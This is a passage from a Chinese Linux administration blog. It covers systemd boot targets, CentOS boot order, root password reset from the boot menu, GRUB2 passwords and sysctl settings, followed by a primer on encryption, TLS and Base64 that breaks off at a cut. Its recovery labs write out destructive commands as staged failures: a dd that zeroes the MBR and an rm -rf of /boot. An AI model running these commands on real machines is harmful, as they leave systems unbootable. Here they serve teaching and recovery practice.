bash">[root@rocky01 ~]<span class="hljs-comment"># systemctl get-default</span><br></code></pre></td></tr></table></figure><h4 id="修改默认级别"><a href="#修改默认级别" class="headerlink" title="修改默认级别"></a>修改默认级别</h4><p>相当于修改 /etc/inittab</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># systemctl set-default name.target</span><br></code></pre></td></tr></table></figure><h4 id="范例：禁用ctrl-alt-delete-重启快捷键"><a href="#范例：禁用ctrl-alt-delete-重启快捷键" class="headerlink" title="范例：禁用ctrl+alt+delete 重启快捷键"></a>范例：禁用ctrl+alt+delete 重启快捷键</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># systemctl mask -f ctrl-alt-del.target</span><br>Removed /etc/systemd/system/ctrl-alt-del.target.<br>Created symlink /etc/systemd/system/ctrl-alt-del.target → /dev/null.<br><br><span class="hljs-comment">#下面两个功能相同：重新加载配置</span><br>[root@rocky01 ~]<span class="hljs-comment"># init q </span><br>[root@rocky01 ~]<span class="hljs-comment"># systemctl daemon-reload</span><br><br><span class="hljs-comment">#注：不加-f参数可能会失败</span><br></code></pre></td></tr></table></figure><h3 id="2-5-设置内核参数"><a href="#2-5-设置内核参数" class="headerlink" title="2.5 设置内核参数"></a>2.5 设置内核参数</h3><p>设置内核参数，只影响当次启动</p><p>启动时，到启动菜单，按e键，找到在linux 开头的行后添加systemd.unit=desired.target</p><p>比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#进入runlevel 3</span><br>systemd.unit=multi-user.target<br></code></pre></td></tr></table></figure><h3 id="2-6-CentOS-7之后版本引导顺序"><a href="#2-6-CentOS-7之后版本引导顺序" class="headerlink" title="2.6 CentOS 7之后版本引导顺序"></a>2.6 CentOS 7之后版本引导顺序</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">1. UEFi或BIOS初始化，运行POST开机自检<br>2. 选择启动设备<br>3. 引导装载程序, centos7是grub2,加载装载程序的配置文件：<br>  /etc/grub.d/<br>  /etc/default/grub <br>  /boot/grub2/grub.cfg<br>4. 加载initramfs驱动模块<br>5. 加载内核选项<br>6. 内核初始化，centos7使用systemd代替init <br>7. 执行initrd.target所有单元，包括挂载/etc/fstab<br>8. 从initramfs根文件系统切换到磁盘根目录<br>9. systemd执行默认target配置，配置文件/etc/systemd/system/default.target<br>10. systemd执行sysinit.target初始化系统及basic.target准备操作系统<br>11. systemd启动multi-user.target下的本机与服务器服务<br>12. systemd执行multi-user.target下的/etc/rc.d/rc.local<br>13. Systemd执行multi-user.target下的getty.target及登录服务<br>14. systemd执行graphical需要的服务<br></code></pre></td></tr></table></figure><h4 id="范例：启动详细过程网页版"><a href="#范例：启动详细过程网页版" class="headerlink" title="范例：启动详细过程网页版"></a>范例：启动详细过程网页版</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># systemd-analyze plot &gt; boot.html</span><br></code></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221009211500981-1978247543.png"><img src="2927659-20221009211500981-1978247543.png" alt="img"></a></p><h3 id="2-7-破解-CentOS-7和8的-root-密码"><a href="#2-7-破解-CentOS-7和8的-root-密码" class="headerlink" title="2.7 破解 CentOS 7和8的 root 密码"></a>2.7 破解 CentOS 7和8的 root 密码</h3><h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">启动时任意键暂停启动<br>按e键进入编辑模式<br>将光标移动linux 开始的行，添加内核参数 rd.break<br>按ctrl-x启动<br>mount –o remount,rw /sysroot<br><span class="hljs-built_in">chroot</span> /sysroot<br>passwd root<br><span class="hljs-comment">#如果SELinux是启用的,才需要执行下面操作,如查没有启动,不需要执行</span><br><span class="hljs-built_in">touch</span> /.autorelabel<br><span class="hljs-built_in">exit</span><br>reboot<br></code></pre></td></tr></table></figure><h4 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#此方式也适用于ubuntu18.04</span><br>启动时任意键暂停启动<br>按e键进入编辑模式<br>将光标移动linux 开始的行，改为 rw init=/sysroot/bin/sh<br>按ctrl-x启动<br><span class="hljs-built_in">chroot</span> /sysroot<br>passwd root<br><span class="hljs-comment">#如果SELinux是启用的,才需要执行下面操作,如查没有启动,不需要执行</span><br><span class="hljs-built_in">touch</span> /.autorelabel<br><span class="hljs-built_in">exit</span><br>reboot<br></code></pre></td></tr></table></figure><h3 id="2-8-实现-GRUB2-安全"><a href="#2-8-实现-GRUB2-安全" class="headerlink" title="2.8 实现 GRUB2 安全"></a>2.8 实现 GRUB2 安全</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#添加grub密码</span><br>[root@rocky01 ~]<span class="hljs-comment"># grub2-setpassword </span><br>Enter password: <br>Confirm password: <br>[root@rocky01 ~]<span class="hljs-comment"># cat /boot/grub2/user.cfg</span><br>GRUB2_PASSWORD=grub.pbkdf2.sha512.10000.60AAA29A65F4DC77E8861EF25BDE2034C9B30CE1<br>E07EE688D7F30460E7E87E7356B0893A6DFFB250B27D2EB9D3ED3E9207199C494D7882E2E8C772C8<br>2E2DDB7A.5E42FD69FA04293DECD68F077E83875A8E4572A7FBB89BA9F161B15EAFE54FBA963FE5D<br>52E16764944823396231803E5118DA1D9CAF3EB73C175A7D7A3682A90<br><br><span class="hljs-comment">#清空grub密码</span><br>[root@centos8 ~]<span class="hljs-comment">#cat /dev/null &gt; /boot/grub2/user.cfg </span><br><span class="hljs-comment">#或者</span><br>[root@centos8 ~]<span class="hljs-comment">#rm -f /boot/grub2/user.cfg</span><br></code></pre></td></tr></table></figure><h3 id="2-9-故障排错实战案例"><a href="#2-9-故障排错实战案例" class="headerlink" title="2.9 故障排错实战案例"></a>2.9 故障排错实战案例</h3><h3 id="实战案例1：CentOS-7-8-破坏MBR后进行恢复"><a href="#实战案例1：CentOS-7-8-破坏MBR后进行恢复" class="headerlink" title="实战案例1：CentOS 7,8 破坏MBR后进行恢复"></a>实战案例1：CentOS 7,8 破坏MBR后进行恢复</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/zero of=/dev/sda bs=1 count=446<br>光盘进入救援模式<br>grub2-install --root-directory=/mnt/sysimage /dev/sda<br></code></pre></td></tr></table></figure><h3 id="实战案例2：CentOS-7-8-删除-boot-grub2-所有内容进行恢复"><a href="#实战案例2：CentOS-7-8-删除-boot-grub2-所有内容进行恢复" class="headerlink" title="实战案例2：CentOS 7,8 删除 /boot/grub2/ 所有内容进行恢复"></a>实战案例2：CentOS 7,8 删除 /boot/grub2/ 所有内容进行恢复</h3><p> <a href="https://img2022.cnblogs.com/blog/2927659/202209/2927659-20220928162542049-754609444.png"><img src="2927659-20220928162542049-754609444.png" alt="img"></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#光盘进入救援模式</span><br><span class="hljs-built_in">chroot</span> /mnt/sysimage<br>grub2-install /dev/sda<br>grub2-mkconfig -o /boot/grub2/grub.cfg<br></code></pre></td></tr></table></figure><h3 id="实战案例3：CentOS-7-8-删除-boot-下所有文件后进行恢复"><a href="#实战案例3：CentOS-7-8-删除-boot-下所有文件后进行恢复" class="headerlink" title="实战案例3：CentOS 7,8 删除 /boot/ 下所有文件后进行恢复"></a>实战案例3：CentOS 7,8 删除 /boot/ 下所有文件后进行恢复</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#模拟删除/boot/下所有文件</span><br>[root@rocky01 ~]<span class="hljs-comment">#rm -rf /boot/*</span><br><br><span class="hljs-comment">#1.光盘救援模式下安装grub2</span><br><span class="hljs-comment">#特别说明：Centos8 必须先修复grub，再安装kernel,否则安装kernel-core时会提示grub出错</span><br><span class="hljs-comment">#centos8</span><br><span class="hljs-built_in">chroot</span> /mnt/sysroot<br><span class="hljs-comment">#centos7</span><br><span class="hljs-built_in">chroot</span> /mnt/sysimage<br><span class="hljs-comment">#安装grub</span><br>grub2-install /dev/sda  <span class="hljs-comment">#BIOS环境</span><br>grub2-install            <span class="hljs-comment">#UEFI环境</span><br><br><span class="hljs-comment">#2.安装Kernel</span><br><span class="hljs-comment">#CentOS 7 </span><br>mount /dev/sr0 /mnt<br>rpm –ivh /mnt/Packages/kernel-3.10.0-1062.el7.x86_64.rpm --force<br><span class="hljs-comment">#CentOS 8 </span><br>mount /dev/sr0 /mnt<br>rpm -ivh /mnt/BaseOS/Packages/kernel-core-4.18.0-147.el8.x86_64.rpm --force<br><br><span class="hljs-comment">#3.修复grub配置文件</span><br><span class="hljs-comment">#生成grub.cfg文件</span><br>grub2-mkconfig –o /boot/grub2/grub.cfg<br><br><span class="hljs-comment">#4.退出重启</span><br><span class="hljs-built_in">sync</span><br><span class="hljs-built_in">sync</span><br><span class="hljs-built_in">exit</span><br><span class="hljs-built_in">exit</span><br></code></pre></td></tr></table></figure><hr><h2 id="3-proc-目录和内核参数管理"><a href="#3-proc-目录和内核参数管理" class="headerlink" title="3 /proc 目录和内核参数管理"></a>3 /proc 目录和内核参数管理</h2><blockquote><p>/proc目录：内核把自己内部状态信息及统计信息，以及可配置参数通过proc伪文件系统加以输出</p><p><strong>sysctl是一个允许改变正在运行中的Linux系统的接口，修改的是针对整个系统的内核参数。sysctl的修改是立即且临时的（重启后失效）。也可以通过修改sysctl.conf配置文件，达到永久生效。</strong></p><p><strong>常用内核参数：</strong></p><ul><li><p><strong>net.ipv4.ip_forward</strong></p></li><li><p>net.ipv4.icmp_echo_ignore_all #禁止ping通本主机</p></li><li><p>net.ipv4.ip_nonlocal_bind  #允许应用程序可以监听本地不存在的IP</p></li><li><p>fs.file-max = 1020000      #全局打开文件的最大数</p></li><li><p>vm.overcommit_memory = 0  </p><ul><li>#0表示内核将检查是否有足够可用内存供应用进程使用；如果有足够的可用内存，内存申请允许；否则内存申请失败，并把错误返回给应用进程。</li><li>#1表示内核允许分配所有的物理内存，而不管当前的内存状态如何。</li><li>#2表示内核允许分配超过所有物理内存和交换空间总和的内存。</li></ul></li></ul><p>vm.swappiness = 10      #设置内存还剩余10%空闲空间时,就会使用swap空间,默认值为30，值越大表示越倾向于使用swap</p><p>#禁用IPv6</p><ul><li>net.ipv6.conf.all.disable_ipv6 = 1</li><li>net.ipv6.conf.default.disable_ipv6 = 1</li></ul></blockquote><h3 id="3-1-sysctl-将值写入变量"><a href="#3-1-sysctl-将值写入变量" class="headerlink" title="3.1 sysctl 将值写入变量"></a>3.1 sysctl 将值写入变量</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl -w path.to.parameter=VALUE<br></code></pre></td></tr></table></figure><h3 id="3-2-默认配置文件"><a href="#3-2-默认配置文件" class="headerlink" title="3.2 默认配置文件"></a>3.2 默认配置文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/sysctl.conf<br></code></pre></td></tr></table></figure><h3 id="范例：临时设置某参数"><a href="#范例：临时设置某参数" class="headerlink" title="范例：临时设置某参数"></a>范例：临时设置某参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl -w parameter=VALUE<br></code></pre></td></tr></table></figure><h3 id="范例：读取配置文件设置参数"><a href="#范例：读取配置文件设置参数" class="headerlink" title="范例：读取配置文件设置参数"></a>范例：读取配置文件设置参数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sysctl -p [/path/to/conf_file]<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>linux安全</title>
    <link href="/2023/07/28/linux%E5%AE%89%E5%85%A8/"/>
    <url>/2023/07/28/linux%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="一、安全机制"><a href="#一、安全机制" class="headerlink" title="一、安全机制"></a>一、安全机制</h1><h2 id="1-加密算法和协议"><a href="#1-加密算法和协议" class="headerlink" title="1 加密算法和协议"></a>1 加密算法和协议</h2><blockquote><ul><li>对称加密</li><li>非对称（公钥）加密</li><li>单向加密</li><li>认证协议</li></ul></blockquote><h3 id="1-1-对称加密算法"><a href="#1-1-对称加密算法" class="headerlink" title="1.1 对称加密算法"></a>1.1 对称加密算法</h3><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018001857347-619543177.png"><img src="2927659-20221018001857347-619543177.png" alt="img"></a></p><blockquote><p><strong>对称加密：加密和解密使用同一个密钥</strong></p><p>特性：</p><ul><li>加密、解密使用同一个密钥，效率高</li><li>将原始数据分割成固定大小的块，逐个进行加密</li></ul><p>缺陷：</p><ul><li>密钥过多</li><li>密钥分发</li><li>数据来源无法确认</li></ul><p>常见对称加密算法:</p><p>DES：Data Encryption Standard，56bits</p><p>3DES：</p><p><strong>AES</strong>：Advanced (128, 192, 256bits)</p><p>Blowfish，Twofish</p><p>IDEA，RC6，CAST5</p></blockquote><hr><h3 id="1-2-非对称加密算法"><a href="#1-2-非对称加密算法" class="headerlink" title="1.2 非对称加密算法"></a>1.2 非对称加密算法</h3><h4 id="1-2-1-介绍"><a href="#1-2-1-介绍" class="headerlink" title="1.2.1 介绍"></a>1.2.1 介绍</h4><blockquote><p><strong>非对称加密：密钥是成对出现</strong></p><ul><li>公钥：public key，公开给所有人，主要给别人加密使用</li><li>私钥：secret key，private key 自己留存，必须保证其私密性，用于自已加密签名</li><li>特点：用公钥加密数据，只能使用与之配对的私钥解密；反之亦然</li></ul><p>功能：</p><ul><li>数据加密：适合加密较小数据,比如: 加密对称密钥</li><li>数字签名：主要在于让接收方确认发送方身份</li></ul><p>缺点：</p><ul><li>密钥长,算法复杂</li><li>加密解密效率低下</li></ul><p>常见算法：</p><ul><li><strong>RSA</strong>：由 RSA 公司发明，是一个支持变长密钥的公共密钥算法，需要加密的文件块的长度也是可变的,可实现加密和数字签名</li><li>DSA（Digital Signature Algorithm）：数字签名算法，是一种标准的 DSS（数字签名标准）</li><li>ECC（Elliptic Curves Cryptography）：椭圆曲线密码编码学，比RSA加密算法使用更小的密钥，提供相当的或更高等级的安全</li></ul></blockquote><h4 id="1-2-2-实现加密"><a href="#1-2-2-实现加密" class="headerlink" title="1.2.2 实现加密"></a>1.2.2 实现加密</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018002330391-1043978088.png"><img src="2927659-20221018002330391-1043978088.png" alt="img"></a></p><blockquote><p><strong>接收者</strong></p><ul><li><strong>生成公钥/密钥对：P和S</strong></li><li><strong>公开公钥P，保密密钥S</strong></li></ul><p><strong>发送者</strong></p><ul><li><strong>使用接收者的公钥来加密消息M</strong></li><li><strong>将P(M)发送给接收者</strong></li></ul><p><strong>接收者</strong></p><ul><li><strong>使用密钥S来解密：M=S(P(M))</strong></li></ul></blockquote><h4 id="1-2-3-实现数字签名"><a href="#1-2-3-实现数字签名" class="headerlink" title="1.2.3 实现数字签名"></a>1.2.3 实现数字签名</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018002554668-1302441161.png"><img src="2927659-20221018002554668-1302441161.png" alt="img"></a></p><blockquote><p>发送者</p><ul><li>生成公钥/密钥对：P和S</li><li>公开公钥P，保密密钥S</li><li>使用密钥S来加密消息M</li><li>发送给接收者S(M)</li></ul><p>接收者</p><ul><li>使用发送者的公钥来解密M=P(S(M))</li></ul></blockquote><h4 id="1-2-4-RSA和DSA"><a href="#1-2-4-RSA和DSA" class="headerlink" title="1.2.4 RSA和DSA"></a>1.2.4 RSA和DSA</h4><blockquote><p>RSA</p><ul><li>公钥加密算法是1977年由Ron Rivest、Adi Shamirh和LenAdleman在（美国麻省理工学院）开发的，RSA取名来自开发他们三者的名字，后成立RSA数据安全有限公司。RSA是目前最有影响力的公钥加密算法，它能够抵抗到目前为止已知的所有密码攻击，已被ISO推荐为公钥数据加密标准。RSA算法基于一个十分简单的数论事实：将两个大素数相乘十分容易，但那时想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥</li></ul><p>DSA</p><ul><li>1991年7月26日提交，并归属于David W. Kravitz前NSA员工，DSA是Schnorr和ElGamal签名算法的变种，被美国NIST作为SS(DigitalSignature Standard)， DSA是基于整数有限域离散对数难题的，其安全性与RSA相比差不多。<strong>DSA只是一种算法，和RSA不同之处在于它不能用作加密和解密，也不能进行密钥交换，只用于签名,它比RSA要快很多</strong></li></ul></blockquote><hr><h3 id="1-3-单向哈希算法"><a href="#1-3-单向哈希算法" class="headerlink" title="1.3 单向哈希算法"></a>1.3 单向哈希算法</h3><blockquote><p>哈希算法：</p><ul><li>也称为散列算法，将任意数据缩小成固定大小的“指纹”，称为digest，即摘要</li></ul><p>特性：</p><ul><li>任意长度输入，固定长度输出</li><li>若修改数据，指纹也会改变，且有雪崩效应，数据的一点微小改变，生成的指纹值变化非常大。</li><li>无法从指纹中重新生成数据，即不要逆，具有单向性</li></ul><p>功能：</p><ul><li>数据完整性</li></ul><p>常见算法</p><ul><li>md5: 128bits、sha1: 160bits、sha224 、sha256、sha384、sha512</li></ul><p>常用工具</p><ul><li><strong>md5sum</strong> | sha1sum [ –check ] file</li><li><strong>openssl</strong>、gpg</li><li>rpm -V</li></ul></blockquote><hr><h3 id="1-4-综合应用多种加密算法"><a href="#1-4-综合应用多种加密算法" class="headerlink" title="1.4 综合应用多种加密算法"></a>1.4 综合应用多种加密算法</h3><h4 id="1-4-1-实现数据加密"><a href="#1-4-1-实现数据加密" class="headerlink" title="1.4.1 实现数据加密"></a>1.4.1 实现数据加密</h4><p><strong>实现数据加密，无法验证数据完整性和来源</strong></p><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018003713522-730791525.png"><img src="2927659-20221018003713522-730791525.png" alt="img"></a></p><h4 id="1-4-2-实现数字签名"><a href="#1-4-2-实现数字签名" class="headerlink" title="1.4.2 实现数字签名"></a>1.4.2 实现数字签名</h4><p><strong>不加密数据，可以保证数据来源的可靠性、数据的完整性和一致性</strong></p><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018003808415-1632798470.png"><img src="2927659-20221018003808415-1632798470.png" alt="img"></a></p><h4 id="1-4-3-综合加密和签名"><a href="#1-4-3-综合加密和签名" class="headerlink" title="1.4.3 综合加密和签名"></a>1.4.3 综合加密和签名</h4><p><strong>即实现数据加密，又可以保证数据来源的可靠性、数据的完整性和一致性</strong></p><h5 id="方法1：Pb-Sa-hash-data-data"><a href="#方法1：Pb-Sa-hash-data-data" class="headerlink" title="方法1：Pb{Sa[hash(data)]+data}"></a>方法1：Pb{Sa[hash(data)]+data}</h5><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018004054155-1863710445.png"><img src="2927659-20221018004054155-1863710445.png" alt="img"></a></p><h5 id="方法2：对称key-Sa-hash-data-data-Pb-对称key"><a href="#方法2：对称key-Sa-hash-data-data-Pb-对称key" class="headerlink" title="方法2：对称key{Sa[hash(data)]+data}+Pb(对称key)"></a>方法2：对称key{Sa[hash(data)]+data}+Pb(对称key)</h5><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018004224400-1964755815.png"><img src="2927659-20221018004224400-1964755815.png" alt="img"></a></p><hr><h3 id="1-5-CA和证书"><a href="#1-5-CA和证书" class="headerlink" title="1.5 CA和证书"></a><strong>1.5 CA和证书</strong></h3><h4 id="1-5-1-中间人攻击"><a href="#1-5-1-中间人攻击" class="headerlink" title="1.5.1 中间人攻击"></a>1.5.1 中间人攻击</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018004408437-2040069815.png"><img src="2927659-20221018004408437-2040069815.png" alt="img"></a></p><h4 id="1-5-2-CA和证书"><a href="#1-5-2-CA和证书" class="headerlink" title="1.5.2 CA和证书"></a>1.5.2 CA和证书</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018004656559-1179429802.png"><img src="2927659-20221018004656559-1179429802.png" alt="img"></a></p><blockquote><p><strong>PKI：Public Key Infrastructure 公共密钥加密体系</strong></p><p><strong>签证机构：CA</strong>（Certificate Authority）</p><p>注册机构：RA</p><p>证书吊销列表：CRL</p><p>证书存取库：</p><p><strong>X.509</strong>：定义了证书的结构以及认证协议标准</p><ul><li>版本号</li><li>序列号</li><li>签名算法</li><li>颁发者</li><li>有效期限</li><li>主体名称</li></ul><p>证书类型：</p><ul><li>证书授权机构的证书</li><li>服务器证书</li><li>用户证书</li></ul><p><strong>获取证书两种方法：</strong></p><ul><li><p><strong>自签名的证书： 自已签发自己的公钥</strong></p></li><li><p><strong>使用证书授权机构：</strong></p></li><li><ul><li><strong>生成证书请求（csr）</strong></li><li><strong>将证书请求csr发送给CA</strong></li><li><strong>CA签名颁发证书</strong></li></ul></li></ul></blockquote><h4 id="1-5-3-安全协议-SSL-TLS"><a href="#1-5-3-安全协议-SSL-TLS" class="headerlink" title="1.5.3 安全协议 SSL/TLS"></a>1.5.3 安全协议 SSL/TLS</h4><h5 id="1-5-3-1-TLS-介绍"><a href="#1-5-3-1-TLS-介绍" class="headerlink" title="1.5.3.1 TLS 介绍"></a>1.5.3.1 TLS 介绍</h5><blockquote><p>SSL：Secure Socket Layer，TLS: Transport Layer Security</p><p>1994年，NetScape公司设计了SSL协议（Secure Sockets Layer）的1.0版，但是未发布</p><p>1995：SSL 2.0 Netscape 开发</p><p>1996：SSL 3.0</p><p>1999：TLS 1.0</p><p>2006：TLS 1.1 IETF(Internet工程任务组) RFC 4346，从2020年3月起，停止支持TLS 1.1及TLS 1.0版本安全协议，谷歌（Chrome）、Mozilla（Firefox）、微软（IE和Edge） 、苹果（Safari） 都会发布新版浏览器执行这个策略</p><p>2008：TLS 1.2 当前主要使用</p><p>2018：TLS 1.3</p><p>功能：</p><ul><li>机密性</li><li>认证</li><li>完整性</li><li>重放保护</li></ul></blockquote><h5 id="1-5-3-2-HTTPS"><a href="#1-5-3-2-HTTPS" class="headerlink" title="1.5.3.2 HTTPS"></a>1.5.3.2 HTTPS</h5><blockquote><p><strong>HTTPS 协议：就是“HTTP 协议”和“SSL/TLS 协议”的组合。</strong></p><p>HTTP over SSL 或 HTTP over TLS ，对http协议的文本数据进行加密处理后，成为二进制形式传输</p></blockquote><h6 id="HTTPS-工作的简化过程"><a href="#HTTPS-工作的简化过程" class="headerlink" title="HTTPS 工作的简化过程"></a>HTTPS 工作的简化过程</h6><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018005530571-1513021450.png"><img src="2927659-20221018005530571-1513021450.png" alt="img"></a></p><blockquote><ol><li>客户端发起HTTPS请求</li></ol><p>用户在浏览器里输入一个https网址，然后连接到服务器的443端口</p><ol start="2"><li>服务端的配置</li></ol><p>采用HTTPS协议的服务器必须要有一套数字证书，可以自己制作，也可以向组织申请。区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面。这套证书其实就是一对公钥和私钥</p><ol start="3"><li>传送服务器的证书给客户端</li></ol><p>证书里其实就是公钥，并且还包含了很多信息，如证书的颁发机构，过期时间等等</p><ol start="4"><li>客户端解析验证服务器证书</li></ol><p>这部分工作是由客户端的TLS来完成的，首先会验证公钥是否有效，比如：颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。如果证书没有问题，那么就生成一个随机值。然后用证书中公钥对该随机值进行非对称加密</p><ol start="5"><li>客户端将加密信息传送服务器</li></ol><p>这部分传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了</p><ol start="6"><li>服务端解密信息</li></ol><p>服务端将客户端发送过来的加密信息用服务器私钥解密后，得到了客户端传过来的随机值</p><ol start="7"><li>服务器加密信息并发送信息</li></ol><p>服务器将数据利用随机值进行对称加密,再发送给客户端</p><ol start="8"><li>客户端接收并解密信息</li></ol><p>客户端用之前生成的随机值解密服务段传过来的数据，于是获取了解密后的内容</p></blockquote><blockquote><p><strong>1 、 首先 HTTP 请求服务端生成证书，客户端对证书的有效期、合法性、域名是否与请求的域名一致、证书的公钥（ RSA 加密）等进行校验；</strong><br><strong>2 、 客户端如果校验通过后，就根据证书的公钥的有效， 生成随机数，随机数使用公钥进行加密（ RSA加密）；</strong><br><strong>3 、 消息体产生的后，对它的摘要进行 MD5 （或者 SHA1 ）算法加密，此时就得到了 RSA 签名；</strong><br><strong>4 、 发送给服务端，此时只有服务端（ RSA 私钥）能解密。</strong><br><strong>5 、 解密得到的随机数，再用 AES 加密，作为密钥（此时的密钥只有客户端和服务端知道）。</strong></p></blockquote><hr><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="二、OpenSSL"><a href="#二、OpenSSL" class="headerlink" title="二、OpenSSL"></a>二、OpenSSL</h1><h2 id="1-Base64-编码"><a href="#1-Base64-编码" class="headerlink" title="1 Base64 编码"></a>1 Base64 编码</h2><p>Base64是网络上最常见的用于传输 8Bit 字节码的编码方式之一，Base64就是一种基于64个可打印字符来表示二进制数据的方法</p><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018010926895-2020571642.png"><img src="2927659-20221018010926895-2020571642.png" alt="img"></a></p><h3 id="base64的编码过程"><a href="#base64的编码过程" class="headerlink" title="base64的编码过程"></a>base64的编码过程</h3><blockquote><p>将每3个字节放入一个24位的缓冲区中，最后不足3个字节的，缓冲区的剩余部分用0来填补。然后每次取出6位（2的6次方为64，使用64个字符即可表示所有），将高2位用0来填充，组成一个新的字节，计算出这个新字节的十进制值，对应上面的编码表，输出相应的字符。这样不断地进行下去，就可完成对所有数据的编码工作。</p></blockquote><p>按照以上规则对文本Man编码如下：</p><p><a href="https://img2022.cnblogs.com/blog/2927659/202210/2927659-20221018011120539-682459929.png"><img src="2927659-20221018011120539-682459929.png" alt="img"></a></p><h3 id="范例：用法"><a href="#范例：用法" class="headerlink" title="范例：用法"></a>范例：用法</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">[root@rocky01 ~]<span class="hljs-comment"># echo -n Dream |base64</span><br>RHJlYW0=<br>[root@rocky01 ~]<span class="hljs-comment"># echo -n RHJlYW0= |base64 -d</span><br>Dream<br></code></pre></td></tr></table></figure><h3 id="范例：破解下面密文"><a href="#范例：破解下面密文" class="headerlink" title="范例：破解下面密文"></a>范例：破解下面密文</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 